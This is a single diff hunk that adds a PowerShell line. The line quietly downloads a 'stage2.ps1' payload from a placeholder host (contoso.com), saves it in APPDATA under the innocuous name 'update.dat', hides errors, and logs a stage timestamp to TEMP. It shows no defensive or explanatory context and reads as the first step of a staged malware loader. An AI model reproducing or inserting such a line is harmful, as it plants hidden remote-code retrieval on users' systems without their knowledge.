@@ -1,0 +1,1 @@
+$PayloadUrl = "https://contoso.com/stage2.ps1"; $DownloadPath = "$env:APPDATA\update.dat"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $DownloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
